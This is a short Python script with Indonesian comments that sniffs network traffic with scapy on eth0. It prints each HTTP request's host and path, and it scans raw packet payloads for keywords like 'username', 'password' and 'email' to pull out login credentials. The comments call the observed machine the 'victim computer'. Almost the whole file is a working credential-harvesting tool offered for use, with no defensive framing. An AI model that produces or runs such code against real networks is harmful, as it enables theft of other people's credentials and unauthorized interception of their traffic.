import scapy.all as scapy
from scapy.layers import http # memanggil module ini untuk kita bisa lebih spesific terhadap layers (dalam kasus ini adalah http)

# start def
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) # iface yaitu pada dasarnya menentukan inteface (antarmuka) yang akan kita targetkan, kemudian store=False artinya kita memerintahkan bahwa jangan menyimpan packet dalam memory komputer kita, dan terakhir yaitu prn=process_sniffed_packet artinya dengan fungsi prn ini kita memungkinkan untuk menentukan fungsi panggilan balik (callback-function) yang dimana nama fungsinya yaitu process_sniffed_pacet.
    
    return
# end def

# start def
def get_url(packet): # funct untuk mengambil url website
    return packet[http.HTTPRequest].Host,packet[http.HTTPRequest].Path # Code ini bertujuan untuk kita dapat menangkap alamat URL dari website yang dituju
# end def

# start def
def get_login_info(packet): # funct untuk mengambil username / password
    if packet.haslayer(scapy.Raw): # kita membuat pengecekan ini untuk bisa langsung mencaputure bagian Raw yang dimana berisi username dan password
            load = str(packet[scapy.Raw].load) # artinya kita akan mencetak packet pada layer/bagian Raw dengan field (kolom) load
            keywords = ["username", "user", "login", "uname", "password", "pass", "passwd", "email"] # membuat kata kunci sebagai triger untuk menangkap setiap paket yang sama seperti kata kunci tersbut untuk ditampilkan.  
            for keyword in keywords: # loop sebanyak keywords
                if keyword in load: # cek jika keyword sama dengan isi dari var load
                    return load # kembalikan value load
# end def

# start def
def process_sniffed_packet(packet): # fungsi yang akan dipanggil balik terus menerus saat function sniff dijalankan
    if packet.haslayer(http.HTTPRequest): # cek jika website memiliki layers dan layers yang dikunjungi/dibuka komputer korban adalah http request 
        url = get_url(packet) # panggil funct get_url yang diisi dalam var url
        print("[+]HTTP Request >>",url)
        
        login_info = get_login_info(packet) # panggil funct get_login_info yang diisi dalam var login_info
        if login_info: # cek apakah ada aktifitas / packet login, jika ada, maka
            print("\n\n[+] Possible Username / Password >",login_info,"\n\n") # print isi packet tersebut
        
    return
# end def

# start def utama
def main():
    sniff("eth0") # panggil funct sniff
    
    return
if __name__=='__main__':
    main()
# end def
